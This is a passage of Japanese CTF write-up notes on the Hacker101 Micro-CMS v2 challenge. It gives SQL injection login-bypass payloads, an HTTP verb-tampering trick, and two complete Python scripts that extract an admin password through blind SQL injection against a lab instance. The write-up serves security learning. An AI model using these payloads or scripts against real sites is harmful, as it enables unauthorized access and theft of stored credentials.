NJS_VERSION=1.13.12.0.2.0-1~stretch LANG=C.UTF-8 SUPERVISOR_ENABLED=1 PYTHON_VERSION=2.7.15 
NGINX_WORKER_PROCESSES=1 SUPERVISOR_SERVER_URL=unix:///var/run/supervisor.sock 
SUPERVISOR_PROCESS_NAME=uwsgi LISTEN_PORT=80 STATIC_INDEX=0 PWD=/app STATIC_PATH=/app/static 
PYTHONPATH=/app UWSGI_RELOADS=0
```
## Micro-CMS v2
https://katsuwosashimi.com/archives/620/hacker101-ctf-micro-cms-v2/  
### login bypass "' union select '1" "1" /  (flag0)
ログインフォームで`' or 1=1`を入力すると以下のようなエラーが出力される。よって、flaskで書かれたサイトで、MariaDBを使っていることがわかる。  
また、`SELECT password FROM admins WHERE username=\'%s\'`となっており、`%`という文字が'%%'にエスケープされることがわかる。  
```txt
Traceback (most recent call last):
  File "./main.py", line 145, in do_login
    if cur.execute('SELECT password FROM admins WHERE username=\'%s\'' % request.form['username'].replace('%', '%%')) == 0:
  File "/usr/local/lib/python2.7/site-packages/MySQLdb/cursors.py", line 255, in execute
    self.errorhandler(self, exc, value)
  File "/usr/local/lib/python2.7/site-packages/MySQLdb/connections.py", line 50, in defaulterrorhandler
    raise errorvalue
ProgrammingError: (1064, "You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''' at line 1")
```
username=`' union select '1`,password=`1`を入力すると条件をクリアしてログインできる！  
これでSecret Pageにアクセスでき、中にFlagが書いてある。  
ちなみに、自力でやったときはこのやり方じゃなくてBlindで普通にusernameとpasswordを特定してログインしてFlag2が先に出力された。そのあとDBをダンプしてSecret PageについてのデータをDatabaseから取り出してFlag0をゲットした。  
### HTTP Verb Tampering (flag1)
**HTTP Verb Tampering**というGETの代わりにPOSTをいれて、アクセスが禁止されているページにPOSTでアクセスするみたいな攻撃手法を使う。  
`/page/edit/1`に対して通常のGETでアクセスすると、loginページにリダイレクトするが、POSTに書き直してアクセスするとFlag1が得られた！  
### MySQL / blind Injection / identify password (flag2)
ログインフォームで以下からBlindができることがわかる！  
ログインできればFlag2ゲット！  
```txt
' or 1 and 1=1 #
Invalid password

' or 1 and 1=2 #
Unknown user
```
よって以下のスクリプトでpasswordを特定できた！  
```python
#!/usr/bin/env python3
# -*- coding:utf-8 -*-

import os
import requests
import urllib.parse

url = "http://35.190.155.168/b77586a1e8/login"
cookie = "d8iuvjr50tjvrmaj2gf97ts6bl"
candidates = [chr(i) for i in range(48, 48+10)] + \
    [chr(i) for i in range(97, 97+26)] + \
    [chr(i) for i in range(65, 65+26)] + \
    [".","-","+","_",":","<",">",";","'","\"","(",")","=","{","}","[","]","\\","|","/","@","$","!","?","&","#"]
headers= {'Cookie':'PHPSESSID='+cookie}

def attack(attack_sql):
    attack_url = url
    data = "username=" + urllib.parse.quote(attack_sql) + "&password=" + urllib.parse.quote("pass")
    #print(data)
    headers.update([('Content-Type','application/x-www-form-urlencoded')])
    res = requests.post(attack_url, headers=headers,verify=False,data=data)
    #print(res.text)
    return res

def create_pass_query(pw):
    # ' or 1 and substr(pass,1,1)='f' -- -
    query = "' or 1 and substr(username," + str(len(pw)) + ",1)='"+pw[-1]+"' limit 2,1 -- -"
    print(query)
    return query

def check_result(res):
    if 'Invalid password' in res.text:
        return True
    return False

####################
###     main     ###
####################

# find pw
fix_pass = ""
is_end = False
while not is_end:
    for c in candidates:
        try_pass = fix_pass + str(c)
        print(try_pass)
        query = create_pass_query(try_pass)
        res = attack(query)
        if check_result(res):
            fix_pass += c
            break
        if c == '#':
            is_end = True
            

print("result: " + fix_pass)
```
binary search版は以下。  
```python
#!/usr/bin/env python3
# -*- coding:utf-8 -*-

import os
import requests
import urllib.parse
import urllib3
from urllib3.exceptions import InsecureRequestWarning
urllib3.disable_warnings(InsecureRequestWarning)

url = "http://35.190.155.168/b77586a1e8/login"
cookie = "d8iuvjr50tjvrmaj2gf97ts6bl"
headers= {'Cookie':'PHPSESSID='+cookie}

def attack(attack_sql):
    attack_url = url
    data = "username=" + urllib.parse.quote(attack_sql) + "&password=" + urllib.parse.quote("pass")
    #print(data)
    headers.update([('Content-Type','application/x-www-form-urlencoded')])
    res = requests.post(attack_url, headers=headers,verify=False,data=data)
    #print(res.text)
    return res


def create_length_query(md,times):
    # ' or 1 and substr(pass,1,1)='f' -- -
    query = "' or 1 and if(length(password) >= " + str(md) + ",1=1,1=3)#"
   # print(query)
    return query

def create_2tansaku_query(md,i,times):
    query = "' or 1 and if(ascii(substr(password," +str(i) + ",1)) >= " + str(md) + ",1=1,1=3)#"
   # print(query)
    return query


def check_result(res):
    if 'Invalid password' in res.text:
        return True
    return False

####################
###     main     ###
####################

def exploit_length(times):
    ok = 0
    ng = 100
    while ok + 1 != ng:
        md = (ok + ng) // 2
        print("    [+] try " + str(md) + "  times:" + str(times))
        query = create_length_query(md,times)
        res = attack(query)
        if check_result(res):
            ok = md
        else:
            ng = md
    print("")
    print("length: " + str(ok) + "  " +str(times) + " times")
    print("")
    return ok
        
def exploit_2tansaku(length,times):
    fix_pass = ""
    for i in range(0,length):
        ok = 0
        ng = 127
        while ok + 1!= ng:
            md = (ok + ng) // 2
            print("    [+] try " + str(md) + "  i: " + str(i) + "  times:" + str(times))
            query = create_2tansaku_query(md,i+1,times)
            res = attack(query)
            if check_result(res):
                ok = md
            else:
                ng = md
        fix_pass += str(chr(ok))
        print("")
        print("progress: " + str(i+1) +"/" + str(length))
        print("result: " + fix_pass)
        print("")
    return fix_pass

#length = exploit_length()
#length = 24
#exploit_2tansaku(int(length))

result = []
loop_times = 100

for i in range(loop_times):
    print("[*] " + str(i) + " times")
    print("")
    length = exploit_length(i)
    res = exploit_2tansaku(length,i)
    if(res == ""):
        print("[-] fix_pass is None. loop break")
        break
    result.append(res)

print("")
print("[-] exploit finished")
[print(a) for a in result]
```
# メモ
https://www.hamayanhamayan.com/entry/2020/06/25/222618  
https://graneed.hatenablog.com/entry/2019/12/29/115100#SQL-Injection  
https://graneed.hatenablog.com/entry/2018/12/16/003745  
https://sqliteonline.com/  
